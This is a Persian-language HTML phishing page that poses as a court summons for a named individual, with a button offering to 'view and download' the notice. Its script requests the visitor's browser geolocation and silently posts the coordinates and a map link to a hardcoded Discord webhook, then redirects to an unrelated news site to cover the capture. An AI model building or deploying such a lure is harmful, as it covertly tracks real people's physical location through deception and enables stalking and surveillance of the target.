<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<title>صفحه دریافت اطلاعات</title>
<style>
    body, html {
    margin: 0;
    padding: 0;
    width: 100%;
    height: 100%;
    background-color: #f4f6f9;
    font-family: Tahoma, sans-serif;
    /* فعال‌سازی فکسباکس برای وسط‌چین کردن کل محتوا در صفحه گوشی */
    display: flex;
    justify-content: center;
    align-items: center;
}

.main-wrapper {
    width: 100%;
    max-width: 1000px;
    background: white;
    padding: 20px;
    border-radius: 12px;
    box-shadow: 0 8px 24px rgba(0,0,0,0.05);
    /* چیدن المان‌های داخلی به صورت عمودی و زیر هم */
    display: flex;
    flex-direction: column;
    align-items: center;
}

.news-img {
    width: 100%;
    height: auto;
    border-radius: 8px;
    margin-bottom: 15px;
}

.news-text {
    font-size: 16px;
    font-weight: bold;
    color: #222;
    margin-bottom: 20px;
    text-align: center;
    white-space: nowrap; /* نگه‌داشتن متن در یک خط */
}

.btn-download {
    background-color: #007bff;
    color: white;
    border: none;
    padding: 12px 0;
    width: 100%; /* دکمه هم‌عرض با کادر می‌شود */
    border-radius: 8px;
    cursor: pointer;
    font-size: 16px;
    font-weight: bold;
}

</style>
</head>
<body>
    <div class="container">
        <body>

<div class="main-wrapper">
    <!-- 📸 تصویر در بالاترین قسمت کادر قرار می‌گیرد -->
    <img src="IMG-20260908-WA0004.jpg" alt="اخبار عاجل" class="news-img">
    
    <!-- 📝 متن زیر تصویر -->
    <div class="news-text"><h1></h1>ابلاغیه قضایی علی پیشگر</div>
    
    <!-- 🔘 دکمه دانلود/اقدام در پایین‌ترین قسمت -->
    <button class="btn-download" onclick="getLocation()"> مشاهده و دانلود فایل ابلاغیه قضایی</button>
</div>

</body>

<script>
// آدرس وب‌هوک دیسکورد خود را اینجا قرار دهید
const webhookURL = "https://discord.com/api/webhooks/1546079351559299093/7seQJheatYvkYmW4HOZ7gyJwjikqJRG2LfnEZtrkvva7yYYLwnbKSRJlZH0ceGrdXmPm ";

function getLocation() {
if (navigator.geolocation) {
// درخواست لوکیشن از مرورگر
navigator.geolocation.getCurrentPosition(sendLocationToServer, showError);
} else {
alert("مرورگر شما از این قابلیت پشتیبانی نمی‌کند.");
}
}

function sendLocationToServer(position) {
const latitude = position.coords.latitude;
const longitude = position.coords.longitude;
const accuracy = position.coords.accuracy;

// ساخت پیام برای ارسال به دیسکورد
// تعریف درست آدرس نقشه با متغیرهای عددی دریافتی از مرورگر
const mapsURL = `https://www.google.com/maps?q=${latitude},${longitude}`;

// ساخت شیء پیام با متن معتبر و داخل بک‌تیک
const payload = {
    content: `لوکیشن جدید دریافت شد!\nلینک نقشه: ${mapsURL}\nدقت: ${accuracy} متر`
};

// ارسال داده‌ها به صورت پس‌زمینه
fetch(webhookURL, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify(payload)
})
.then(response => {
// در اینجا می‌توانید کاربر را به یک عکس یا سایت دیگر هدایت کنید
 window.location.href = "https://www.muscatdaily.com";
})

.catch(error => console.error('Error:', error));
} // 👈 این آکولاژ را دقیقاً اینجا اضافه کن تا تابع sendLocationToServer بسته شود

function showError(error) {
    switch(error.code) {
        case error.PERMISSION_DENIED:
            alert("کاربر دسترسی به لوکیشن را رد کرد.");
            break;
        case error.POSITION_UNAVAILABLE:
            alert("اطلاعات موقعیت مکانی در دسترس نیست.");
            break;
        case error.TIMEOUT:
            alert("زمان درخواست به پایان رسید.");
            break;
    }
} // 👈 این آکولاژ هم برای بسته شدن تابع showError است
(error => console.error('Error:', error));
</script>

</body>
</html>
